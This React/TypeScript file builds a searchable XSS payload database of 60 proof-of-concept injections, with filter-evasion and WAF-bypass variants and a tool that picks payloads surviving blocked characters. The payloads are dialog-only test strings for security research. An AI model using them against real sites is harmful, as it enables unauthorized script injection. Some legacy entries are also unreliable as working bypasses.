import { useState, useMemo } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Copy, Search, Download, Plus, Filter, RefreshCw } from "lucide-react"
import { useToast } from "@/hooks/use-toast"

interface PayloadData {
  id: number
  payload: string
  description: string
  tags: string[]
  filteredChars: string[]
  category: string
}

// XSS Payload Database - Comprehensive collection for security research
const payloadDatabase: PayloadData[] = [
  // Basic XSS Payloads
  {
    id: 1,
    payload: '<script>alert("XSS")</script>',
    description: 'Basic script tag execution',
    tags: ['basic', 'script'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Basic'
  },
  {
    id: 2,
    payload: '<script>alert(1)</script>',
    description: 'Simple numeric alert',
    tags: ['basic', 'script', 'numeric'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Basic'
  },
  {
    id: 3,
    payload: '<script>prompt("XSS")</script>',
    description: 'Basic prompt execution',
    tags: ['basic', 'script', 'prompt'],
    filteredChars: ['<', '>', 'script', 'prompt'],
    category: 'Basic'
  },
  {
    id: 4,
    payload: '<script>confirm("XSS")</script>',
    description: 'Basic confirm dialog',
    tags: ['basic', 'script', 'confirm'],
    filteredChars: ['<', '>', 'script', 'confirm'],
    category: 'Basic'
  },

  // Event Handler Payloads
  {
    id: 5,
    payload: '<img src=x onerror=alert("XSS")>',
    description: 'Image tag with onerror event',
    tags: ['image', 'onerror'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 6,
    payload: '<svg onload=alert("XSS")>',
    description: 'SVG with onload event',
    tags: ['svg', 'onload'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 7,
    payload: '<input onfocus=alert("XSS") autofocus>',
    description: 'Input with autofocus and onfocus',
    tags: ['input', 'onfocus', 'autofocus'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 8,
    payload: '<details ontoggle=alert("XSS") open>',
    description: 'Details tag with ontoggle event',
    tags: ['details', 'ontoggle'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 9,
    payload: '<marquee onstart=alert("XSS")>',
    description: 'Marquee with onstart event',
    tags: ['marquee', 'onstart'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 10,
    payload: '<body onload=alert("XSS")>',
    description: 'Body tag with onload event',
    tags: ['body', 'onload'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 11,
    payload: '<video><source onerror="alert(\'XSS\')">',
    description: 'Video source with onerror',
    tags: ['video', 'source', 'onerror'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 12,
    payload: '<audio src=x onerror=alert("XSS")>',
    description: 'Audio with onerror event',
    tags: ['audio', 'onerror'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 13,
    payload: '<select onfocus=alert("XSS") autofocus>',
    description: 'Select with autofocus and onfocus',
    tags: ['select', 'onfocus', 'autofocus'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 14,
    payload: '<textarea onfocus=alert("XSS") autofocus>',
    description: 'Textarea with autofocus and onfocus',
    tags: ['textarea', 'onfocus', 'autofocus'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },
  {
    id: 15,
    payload: '<keygen onfocus=alert("XSS") autofocus>',
    description: 'Keygen with autofocus and onfocus',
    tags: ['keygen', 'onfocus', 'autofocus'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Event Handler'
  },

  // Protocol Payloads
  {
    id: 16,
    payload: 'javascript:alert("XSS")',
    description: 'JavaScript protocol',
    tags: ['javascript', 'protocol'],
    filteredChars: ['javascript', 'alert'],
    category: 'Protocol'
  },
  {
    id: 17,
    payload: '<iframe src="javascript:alert(\'XSS\')">',
    description: 'Iframe with JavaScript protocol',
    tags: ['iframe', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Protocol'
  },
  {
    id: 18,
    payload: '<a href="javascript:alert(\'XSS\')">Click me</a>',
    description: 'Link with JavaScript protocol',
    tags: ['link', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Protocol'
  },
  {
    id: 19,
    payload: '<form action="javascript:alert(\'XSS\')">',
    description: 'Form with JavaScript action',
    tags: ['form', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Protocol'
  },

  // Obfuscation Payloads
  {
    id: 20,
    payload: '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
    description: 'Character code obfuscation',
    tags: ['obfuscation', 'fromcharcode'],
    filteredChars: ['<', '>', 'script'],
    category: 'Obfuscation'
  },
  {
    id: 21,
    payload: '<script>window["ale"+"rt"]("XSS")</script>',
    description: 'String concatenation bypass',
    tags: ['concatenation', 'bypass'],
    filteredChars: ['<', '>', 'script'],
    category: 'Obfuscation'
  },
  {
    id: 22,
    payload: '<script>alert(/XSS/)</script>',
    description: 'Regular expression instead of string',
    tags: ['regex', 'alternative'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Obfuscation'
  },
  {
    id: 23,
    payload: '<script>alert`XSS`</script>',
    description: 'Template literal syntax',
    tags: ['template-literal', 'es6'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Obfuscation'
  },
  {
    id: 24,
    payload: '<script>top["al"+"ert"]("XSS")</script>',
    description: 'Top window reference with concatenation',
    tags: ['top', 'concatenation'],
    filteredChars: ['<', '>', 'script'],
    category: 'Obfuscation'
  },
  {
    id: 25,
    payload: '<script>self["ale"+"rt"]("XSS")</script>',
    description: 'Self reference with concatenation',
    tags: ['self', 'concatenation'],
    filteredChars: ['<', '>', 'script'],
    category: 'Obfuscation'
  },

  // Bypass Techniques
  {
    id: 26,
    payload: '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    description: 'Tag breaking technique',
    tags: ['tag-breaking', 'nested'],
    filteredChars: ['<', '>', 'script'],
    category: 'Bypass'
  },
  {
    id: 27,
    payload: '<script>alert("XS"+"S")</script>',
    description: 'String splitting bypass',
    tags: ['string-split', 'concatenation'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Bypass'
  },
  {
    id: 28,
    payload: '<script>ale\\u0072t("XSS")</script>',
    description: 'Unicode escape sequence',
    tags: ['unicode', 'escape'],
    filteredChars: ['<', '>', 'script'],
    category: 'Bypass'
  },
  {
    id: 29,
    payload: '<script>\\u0061lert("XSS")</script>',
    description: 'Unicode escape at start',
    tags: ['unicode', 'escape'],
    filteredChars: ['<', '>', 'script'],
    category: 'Bypass'
  },
  {
    id: 30,
    payload: '<script>alert(String.fromCharCode(88,83,83))</script>',
    description: 'Character code for payload content',
    tags: ['charcode', 'string'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Bypass'
  },

  // Context-Based Payloads
  {
    id: 31,
    payload: '<svg><script>alert("XSS")</script></svg>',
    description: 'Script inside SVG',
    tags: ['svg', 'script', 'nested'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Context'
  },
  {
    id: 32,
    payload: '<math><mtext><script>alert("XSS")</script></mtext></math>',
    description: 'Script inside MathML',
    tags: ['mathml', 'script'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Context'
  },
  {
    id: 33,
    payload: '<foreignObject><script>alert("XSS")</script></foreignObject>',
    description: 'Script inside foreignObject',
    tags: ['foreignobject', 'script'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Context'
  },
  {
    id: 34,
    payload: '<title><script>alert("XSS")</script></title>',
    description: 'Script inside title (some parsers)',
    tags: ['title', 'script'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Context'
  },

  // Media & Object Payloads
  {
    id: 35,
    payload: '<object data="javascript:alert(\'XSS\')">',
    description: 'Object with JavaScript data',
    tags: ['object', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Object'
  },
  {
    id: 36,
    payload: '<embed src="javascript:alert(\'XSS\')">',
    description: 'Embed with JavaScript source',
    tags: ['embed', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Object'
  },
  {
    id: 37,
    payload: '<applet code="javascript:alert(\'XSS\')">',
    description: 'Applet with JavaScript code',
    tags: ['applet', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Object'
  },

  // CSS-Based Payloads
  {
    id: 38,
    payload: '<style>@import"javascript:alert(\'XSS\')";</style>',
    description: 'CSS import with JavaScript',
    tags: ['style', 'import', 'css'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'CSS'
  },
  {
    id: 39,
    payload: '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    description: 'CSS background with JavaScript',
    tags: ['style', 'background', 'css'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'CSS'
  },
  {
    id: 40,
    payload: '<style>@-moz-document url-prefix(){*{color:red;}}</style><script>alert("XSS")</script>',
    description: 'Mozilla-specific CSS bypass',
    tags: ['css', 'mozilla', 'bypass'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'CSS'
  },

  // Meta & Link Payloads  
  {
    id: 41,
    payload: '<link rel=import href="javascript:alert(\'XSS\')">',
    description: 'Link with import and JavaScript',
    tags: ['link', 'import', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Import'
  },
  {
    id: 42,
    payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    description: 'Meta refresh with JavaScript',
    tags: ['meta', 'refresh', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Meta'
  },
  {
    id: 43,
    payload: '<meta charset="UTF-7" /><script>alert("XSS")</script>',
    description: 'UTF-7 charset bypass',
    tags: ['meta', 'charset', 'utf7'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'Meta'
  },

  // HTML5 & Modern Payloads
  {
    id: 44,
    payload: '<canvas id="c" width="100" height="100"></canvas><script>var c=document.getElementById("c");var ctx=c.getContext("2d");ctx.fillText("XSS",10,50);alert("XSS");</script>',
    description: 'Canvas-based XSS',
    tags: ['canvas', 'html5'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'HTML5'
  },
  {
    id: 45,
    payload: '<video poster="javascript:alert(\'XSS\')">',
    description: 'Video poster with JavaScript',
    tags: ['video', 'poster', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'HTML5'
  },
  {
    id: 46,
    payload: '<source src="javascript:alert(\'XSS\')" type="video/mp4">',
    description: 'Source with JavaScript URL',
    tags: ['source', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'HTML5'
  },

  // Attribute-Based Payloads
  {
    id: 47,
    payload: '<table background="javascript:alert(\'XSS\')">',
    description: 'Table background with JavaScript',
    tags: ['table', 'background', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'HTML Attribute'
  },
  {
    id: 48,
    payload: '<input type="image" src="javascript:alert(\'XSS\')">',
    description: 'Image input with JavaScript source',
    tags: ['input', 'image', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'HTML Attribute'
  },
  {
    id: 49,
    payload: '<button onclick="alert(\'XSS\')">Click</button>',
    description: 'Button with onclick event',
    tags: ['button', 'onclick'],
    filteredChars: ['<', '>', 'alert'],
    category: 'HTML Attribute'
  },
  {
    id: 50,
    payload: '<div style="background-image:url(javascript:alert(\'XSS\'))">',
    description: 'Div with CSS JavaScript background',
    tags: ['div', 'style', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'HTML Attribute'
  },

  // Filter Evasion Payloads
  {
    id: 51,
    payload: '<IMG SRC="javascript:alert(\'XSS\');">',
    description: 'Uppercase tag bypass',
    tags: ['uppercase', 'image', 'javascript'],
    filteredChars: ['javascript', 'alert'],
    category: 'Filter Evasion'
  },
  {
    id: 52,
    payload: '<img src=JaVaScRiPt:alert(\'XSS\')>',
    description: 'Mixed case JavaScript protocol',
    tags: ['mixedcase', 'javascript'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Filter Evasion'
  },
  {
    id: 53,
    payload: '<img src=`javascript:alert("XSS")` onerror="alert(\'XSS\')">',
    description: 'Backtick quotes with fallback',
    tags: ['backtick', 'onerror', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Filter Evasion'
  },
  {
    id: 54,
    payload: '<img/src="javascript:alert(\'XSS\')">',
    description: 'Malformed tag with slash',
    tags: ['malformed', 'javascript'],
    filteredChars: ['<', '>', 'javascript', 'alert'],
    category: 'Filter Evasion'
  },
  {
    id: 55,
    payload: '<img src="java&#x09;script:alert(\'XSS\')">',
    description: 'HTML entity tab in JavaScript',
    tags: ['entity', 'tab', 'javascript'],
    filteredChars: ['<', '>', 'alert'],
    category: 'Filter Evasion'
  },

  // WAF Bypass Payloads
  {
    id: 56,
    payload: '<svg/onload=alert(/XSS/)>',
    description: 'SVG with slash and regex',
    tags: ['svg', 'onload', 'regex', 'slash'],
    filteredChars: ['<', '>', 'alert'],
    category: 'WAF Bypass'
  },
  {
    id: 57,
    payload: '<img src=x onerror=prompt`XSS`>',
    description: 'Prompt with template literal',
    tags: ['image', 'onerror', 'template-literal', 'prompt'],
    filteredChars: ['<', '>', 'prompt'],
    category: 'WAF Bypass'
  },
  {
    id: 58,
    payload: '<svg onload=co\\u006efirm(1)>',
    description: 'SVG with unicode escape in confirm',
    tags: ['svg', 'onload', 'unicode', 'confirm'],
    filteredChars: ['<', '>', 'confirm'],
    category: 'WAF Bypass'
  },
  {
    id: 59,
    payload: '<iframe srcdoc="<svg onload=alert(1)>">',
    description: 'Iframe srcdoc with nested SVG',
    tags: ['iframe', 'srcdoc', 'svg', 'nested'],
    filteredChars: ['<', '>', 'alert'],
    category: 'WAF Bypass'
  },
  {
    id: 60,
    payload: '<object data="data:text/html,<script>alert(1)</script>">',
    description: 'Data URI in object',
    tags: ['object', 'data-uri', 'script'],
    filteredChars: ['<', '>', 'script', 'alert'],
    category: 'WAF Bypass'
  }
]

const filterOptions = [
  { char: '<', label: '<' },
  { char: '>', label: '>' },
  { char: 'script', label: 'script' },
  { char: 'alert', label: 'alert' },
  { char: 'prompt', label: 'prompt' },
  { char: 'confirm', label: 'confirm' },
  { char: 'javascript', label: 'javascript' },
  { char: "'", label: "'" },
  { char: '"', label: '"' },
  { char: '(', label: '(' },
  { char: ')', label: ')' },
  { char: '=', label: '=' },
  { char: '{', label: '{' },
  { char: '}', label: '}' },
  { char: ';', label: ';' },
  { char: ':', label: ':' },
  { char: 'Event Handler on*', label: 'Event Handler on* blocked' },
  { char: 'Alert, Confirm, prompt', label: 'Alert, Confirm, prompt blocked' },
  { char: 'Event Handler on* & Alert, Confirm, prompt', label: 'Event Handler on* & Alert, Confirm, prompt blocked' },
  { char: 'import', label: 'import' },
  { char: 'eval', label: 'eval' },
  { char: 'document', label: 'document' },
  { char: 'window', label: 'window' }
]

export default function PayloadDatabase() {
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedFilters, setSelectedFilters] = useState<string[]>([])
  const [selectedCategory, setSelectedCategory] = useState<string>("all")
  const [customPayload, setCustomPayload] = useState("")
  const [showAddPayload, setShowAddPayload] = useState(false)
  const { toast } = useToast()

  const filteredPayloads = useMemo(() => {
    return payloadDatabase.filter(payload => {
      // Category filter
      const matchesCategory = selectedCategory === "all" || payload.category === selectedCategory

      // Search term filter
      const matchesSearch = searchTerm === "" || 
        payload.payload.toLowerCase().includes(searchTerm.toLowerCase()) ||
        payload.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
        payload.tags.some(tag => tag.toLowerCase().includes(searchTerm.toLowerCase()))

      // Character filter - show payloads that DON'T contain the selected filtered characters
      const matchesFilters = selectedFilters.length === 0 || 
        selectedFilters.every(filter => {
          // Special handling for complex filters
          if (filter === 'Event Handler on*') {
            return !/(on\w+\s*=)/i.test(payload.payload)
          }
          if (filter === 'Alert, Confirm, prompt') {
            return !/\b(alert|confirm|prompt)\s*\(/i.test(payload.payload)
          }
          if (filter === 'Event Handler on* & Alert, Confirm, prompt') {
            return !/(on\w+\s*=)/i.test(payload.payload) && 
                   !/\b(alert|confirm|prompt)\s*\(/i.test(payload.payload)
          }
          
          return !payload.filteredChars.includes(filter)
        })

      return matchesCategory && matchesSearch && matchesFilters
    })
  }, [searchTerm, selectedFilters, selectedCategory])

  const toggleFilter = (char: string) => {
    setSelectedFilters(prev => 
      prev.includes(char) 
        ? prev.filter(f => f !== char)
        : [...prev, char]
    )
  }

  const copyPayload = async (payload: string) => {
    try {
      await navigator.clipboard.writeText(payload)
      toast({
        title: "Copied!",
        description: "Payload copied to clipboard",
      })
    } catch (err) {
      toast({
        title: "Error",
        description: "Failed to copy payload",
        variant: "destructive",
      })
    }
  }

  const clearFilters = () => {
    setSelectedFilters([])
    setSearchTerm("")
    setSelectedCategory("all")
  }

  const downloadPayloads = () => {
    const payloadText = filteredPayloads.map(p => 
      `${p.payload}\n// ${p.description}\n// Category: ${p.category}\n// Tags: ${p.tags.join(', ')}\n`
    ).join('\n')
    
    const blob = new Blob([payloadText], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'xss-payloads.txt'
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
    
    toast({
      title: "Downloaded!",
      description: `${filteredPayloads.length} payloads exported to file`,
    })
  }

  const copyAllPayloads = async () => {
    const payloadText = filteredPayloads.map(p => p.payload).join('\n')
    try {
      await navigator.clipboard.writeText(payloadText)
      toast({
        title: "Copied!",
        description: `${filteredPayloads.length} payloads copied to clipboard`,
      })
    } catch (err) {
      toast({
        title: "Error",
        description: "Failed to copy payloads",
        variant: "destructive",
      })
    }
  }

  const refreshPayloads = () => {
    clearFilters()
    toast({
      title: "Refreshed!",
      description: "Payload database refreshed",
    })
  }

  const categories = ["all", ...Array.from(new Set(payloadDatabase.map(p => p.category)))]

  return (
    <div className="min-h-screen bg-background text-foreground p-4 md:p-6">
      <div className="max-w-7xl mx-auto space-y-4 md:space-y-6">
        {/* Header */}
        <div className="text-center space-y-2">
          <h1 className="text-2xl md:text-4xl font-bold text-primary">XSS PAYLOAD DATABASE</h1>
          <p className="text-sm md:text-base text-muted-foreground">
            Select karakter yang terkena filter
          </p>
        </div>

        {/* Enhanced Search and Controls */}
        <div className="grid gap-3 md:gap-4 md:grid-cols-2">
          <Card>
            <CardContent className="p-4 md:p-6">
              <div className="relative">
                <Search className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search payloads..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-10 text-sm md:text-base"
                />
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-4 md:p-6">
              <div className="flex gap-2">
                <Select value={selectedCategory} onValueChange={setSelectedCategory}>
                  <SelectTrigger className="flex-1 text-xs md:text-sm">
                    <SelectValue placeholder="Select category" />
                  </SelectTrigger>
                  <SelectContent>
                    {categories.map(category => (
                      <SelectItem key={category} value={category} className="text-xs md:text-sm">
                        {category === "all" ? "All Categories" : category}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                <Button onClick={refreshPayloads} variant="outline" size="icon" className="h-10 w-10">
                  <RefreshCw className="h-3 w-3 md:h-4 md:w-4" />
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Filter Options */}
        <Card>
          <CardHeader className="p-4 md:p-6">
            <CardTitle className="flex flex-col md:flex-row md:justify-between md:items-center gap-3 md:gap-0">
              <div className="flex items-center gap-2 text-base md:text-lg">
                <Filter className="h-4 w-4 md:h-5 md:w-5" />
                Character Filters
              </div>
              <div className="flex flex-wrap gap-2">
                <Button onClick={downloadPayloads} variant="outline" size="sm" className="text-xs md:text-sm">
                  <Download className="h-3 w-3 md:h-4 md:w-4 mr-1 md:mr-2" />
                  Export
                </Button>
                <Button onClick={copyAllPayloads} variant="outline" size="sm" className="text-xs md:text-sm">
                  <Copy className="h-3 w-3 md:h-4 md:w-4 mr-1 md:mr-2" />
                  Copy All
                </Button>
                <Button onClick={clearFilters} variant="outline" size="sm" className="text-xs md:text-sm">
                  Clear
                </Button>
              </div>
            </CardTitle>
          </CardHeader>
          <CardContent className="p-4 md:p-6 pt-0">
            <div className="flex flex-wrap gap-1 md:gap-2">
              {filterOptions.map(option => (
                <Badge
                  key={option.char}
                  variant={selectedFilters.includes(option.char) ? "default" : "outline"}
                  className="cursor-pointer px-2 py-1 text-xs md:text-sm"
                  onClick={() => toggleFilter(option.char)}
                >
                  {option.label}
                </Badge>
              ))}
            </div>
            {selectedFilters.length > 0 && (
              <div className="mt-3 md:mt-4 p-3 bg-muted rounded-lg">
                <p className="text-xs md:text-sm text-muted-foreground mb-2">
                  Showing payloads that work when these characters are filtered:
                </p>
                <div className="flex flex-wrap gap-1">
                  {selectedFilters.map(filter => (
                    <Badge key={filter} variant="destructive" className="text-xs">
                      {filter}
                    </Badge>
                  ))}
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Enhanced Results Stats */}
        <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3 md:gap-4">
          <div className="flex items-center gap-2">
            <p className="text-sm md:text-base text-muted-foreground">
              Found <span className="font-bold text-primary">{filteredPayloads.length}</span> payload(s)
            </p>
            {selectedCategory !== "all" && (
              <Badge variant="secondary" className="text-xs">
                {selectedCategory}
              </Badge>
            )}
          </div>
          <div className="flex flex-wrap gap-1 md:gap-2">
            {categories.slice(1).map(category => {
              const count = filteredPayloads.filter(p => p.category === category).length
              return count > 0 && (
                <Badge 
                  key={category} 
                  variant={selectedCategory === category ? "default" : "outline"}
                  className="text-xs"
                >
                  {category}: {count}
                </Badge>
              )
            })}
          </div>
        </div>

        {/* Payload Results */}
        <div className="grid gap-3 md:gap-4">
          {filteredPayloads.length === 0 ? (
            <Card>
              <CardContent className="p-6 text-center">
                <p className="text-sm md:text-base text-muted-foreground">
                  No payloads found matching your filters. Try removing some filters or adjusting your search.
                </p>
              </CardContent>
            </Card>
          ) : (
            filteredPayloads.map(payload => (
              <Card key={payload.id} className="hover:bg-card/80 transition-colors">
                <CardContent className="p-4 md:p-6">
                  <div className="space-y-3 md:space-y-4">
                    {/* Payload */}
                    <div className="flex flex-col sm:flex-row justify-between items-start gap-3">
                      <div className="flex-1 min-w-0">
                        <code className="block p-3 bg-payload-bg border border-payload-border rounded font-mono text-xs md:text-sm break-all whitespace-pre-wrap">
                          {payload.payload}
                        </code>
                      </div>
                      <Button 
                        onClick={() => copyPayload(payload.payload)}
                        variant="outline" 
                        size="sm"
                        className="shrink-0 self-start sm:self-center"
                      >
                        <Copy className="h-3 w-3 md:h-4 md:w-4" />
                      </Button>
                    </div>

                    {/* Description and Metadata */}
                    <div className="space-y-2">
                      <p className="text-xs md:text-sm text-muted-foreground leading-relaxed">
                        {payload.description}
                      </p>
                      
                      <div className="flex flex-wrap gap-1 md:gap-2 items-center">
                        <Badge variant="secondary" className="text-xs">
                          {payload.category}
                        </Badge>
                        {payload.tags.map(tag => (
                          <Badge key={tag} variant="outline" className="text-xs">
                            {tag}
                          </Badge>
                        ))}
                      </div>

                      {payload.filteredChars.length > 0 && (
                        <div className="text-xs text-muted-foreground">
                          <span className="font-medium">Filtered chars:</span>{' '}
                          {payload.filteredChars.join(', ')}
                        </div>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))
          )}
        </div>
      </div>
    </div>
  )
}